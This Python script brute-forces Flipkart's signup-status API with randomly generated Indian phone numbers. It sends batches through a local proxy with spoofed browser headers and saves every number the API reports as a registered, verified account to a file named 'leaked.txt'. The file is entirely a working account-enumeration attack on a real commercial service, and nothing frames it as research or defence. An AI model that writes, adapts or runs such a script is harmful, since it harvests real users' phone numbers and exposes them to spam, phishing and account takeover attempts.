#!/usr/bin/env python3
import requests
from random import randint
import json
def random_with_N_digits(n):
    range_start = 10**(n-1)
    range_end = (10**n)-1
    return randint(range_start, range_end)


b = []
f = open('leaked.txt','wt')
for i in range(0,1000):
    b = []
    for j in range(10):
        b.append('+91912'+str(random_with_N_digits(7)))
        data = {"loginId":b , "supportAllStates":"true"}
    data = json.dumps(data,separators=(',',':'))
    url = 'https://www.flipkart.com/api/6/user/signup/status'
    proxy = {'http':'http://127.0.0.1:8080/'}
    headers = {'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0',
            'X-user-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 FKUA/website/41/website/Desktop',
            'Content-Type': 'application/json',
            'Origin': 'https://www.flipkart.com' }
    r = requests.post(url,data=data,proxies=proxy,headers=headers)
    response = json.loads(r.text)
    b = response['RESPONSE']['userDetails']
    for i in b.keys():
        if b[i] == "VERIFIED":
            f.write("{} found in database".format(i))
            print ("{} found in database".format(i))
'''
data = {enrol:str(c+1)}
 50     print (str(json.dumps(data)))
 '''
